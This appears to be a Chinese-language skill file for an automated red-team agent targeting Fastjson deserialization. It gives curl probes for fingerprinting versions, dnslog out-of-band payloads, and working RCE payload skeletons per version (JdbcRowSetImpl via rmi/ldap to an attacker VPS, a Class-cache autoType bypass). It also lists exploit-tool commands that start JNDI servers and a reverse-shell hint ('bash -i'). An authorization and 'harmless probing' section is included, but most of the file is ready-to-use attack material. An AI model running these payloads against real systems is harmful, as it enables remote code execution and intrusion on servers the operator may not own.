---
name: framework-fastjson
description: Fastjson 专项：报错/InetAddress/dnslog 三级版本判定 oracle、按版本选利用链（1.2.24 JdbcRowSetImpl、1.2.47 Class 缓存绕过、1.2.68 safeMode）、JNDI 回连配合与高版本 JDK 限制、无害探测纪律
whenToUse: 抓到 JSON 请求体、报错栈出现 fastjson 字样、或 Java 资产需无回显反序列化探测时
role: vuln-scan
enabled: true
---

# Fastjson 框架专项

## 版本判定 oracle（从无害到定性）

### 1. 报错回显（无 dnslog 依赖，最快）

```bash
curl -s -X POST "http://$TARGET/api" -H "Content-Type: application/json" -d '{"a":"\'
# 响应含 "fastjson" / "jsonparse" / "syntax error, expect [, actual string" → fastjson 确认
```

常见栈：`com.alibaba.fastjson.JSONException`、`com.alibaba.fastjson.parser.DefaultJSONParser`。

### 2. InetAddress 探测（≤1.2.45 附近可回显）

```bash
# 部分版本直接把解析结果带进响应/报错
curl -s -X POST "http://$TARGET/api" -H "Content-Type: application/json" \
  -d '{"@type":"java.net.InetAddress","val":"123456.dnslog.cn"}'
```

### 3. dnslog 带外定性（全版本通用、无害）

| Payload | 覆盖版本 |
|---|---|
| `{"@type":"java.net.Inet4Address","val":"xx.dnslog.cn"}` | 大多 ≤1.2.68 |
| `{"@type":"java.net.URL","val":"http://xx.dnslog.cn"}` | URL 类触发 DNS 解析，更宽 |

DNS 回连即定性"存在反序列化解析"，**不代表可 RCE**——RCE 判定必须落到下一节版本-链匹配。

## 利用链按版本选择

| 版本 | 链 | Payload 骨架 |
|---|---|---|
| ≤1.2.24 | JdbcRowSetImpl（RMI/LDAP） | `{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://VPS:1099/Obj","autoCommit":true}` |
| 1.2.25-1.2.47 | checkAutoType 绕过：Class 缓存注入 | `{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://VPS:1389/Obj","autoCommit":true}}` |
| 1.2.48-1.2.68 | expectClass 绕过（AutoCloseable/Throwable 族） | 需目标依赖特定 gadget 类，成功率低，先做 dnslog 定性 |
| ≥1.2.68 + safeMode 开启 | — | `ParserConfig.getSafeMode()` 后 @type 全禁，只有信息泄露面，停止 |
| ≥1.2.83 | — | expectClass 收口，转为找新依赖 gadget，一般直接放弃 |

```bash
# exphub 一键验证（1.2.47 通杀 ≤1.2.47）
python3 fastjson-1.2.47_rce.py http://$TARGET/ ldap://$VPS:8899/Exploit
```

## JNDI 注入配合

```bash
# welk1n/JNDI-Injection-Exploit：一键起 RMI(1099)+LDAP(1389)+HTTP(8180) 三服务，产出可用 JNDI 链接
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "curl http://$VPS:8180/hit" -A $VPS_IP
# 输出的 rmi://$VPS:1099/xxxx / ldap://$VPS:1389/xxxx 填进上面各版本 Payload 的 dataSourceName
# 命令经 Runtime.exec()，bash 语法要整体双引号：bash -c "{echo,...}|{base64,-d}|{bash,-i}"
```

**高版本 JDK 限制（决定链路死活）：**

| 目标 JDK | LDAP/RMI 远程 class 加载 | 对策 |
|---|---|---|
| 6u211 / 7u201 / 8u191 之前 | 允许 | 直接 JNDI 链接回连加载 |
| 之后（默认 trustURLCodebase=false） | 拒绝远程 class | 换本地 BeanFactory/Tomcat EL gadget 的 LDAP 返回，或只做 dnslog 定性后移交报告 |

JDK 11+ 同样默认禁 codebase。指纹侧可从报错栈/Server 头估 JDK 版本，决定是否值得起 LDAP。

## 无害探测纪律

- 第一轮**只用** `Inet4Address`/`URL`/报错三类 payload；`TemplatesImpl`、`JdbcRowSetImpl` 等执行型链只在授权明确、dnslog 定性之后才发。
- JNDI 回连服务端只挂 `curl`/dnslog 类探测命令，不上 webshell 类 class。
- 探测请求与结果一一记录（时间、payload、dnslog 命中时间戳），避免 SRC 复盘时无法自证。
- 仅授权范围、证据脱敏（VPS IP 打码）、不破坏目标（不发 DoS 型深嵌套 payload，如超长数组/深递归）。

## 产出约定

- 记录：报错栈指纹、dnslog 命中、判定版本区间、所选链与回连服务日志。
- 回填 `redteam_poc_add`：category=fastjson（区分 fastjson-rce / fastjson-probe 两个层级），language=json/http，usage 附 payload 与版本判据。

<!-- 改编自: welk1n/JNDI-Injection-Exploit, zhzyker/exphub, 2026-10-31 -->
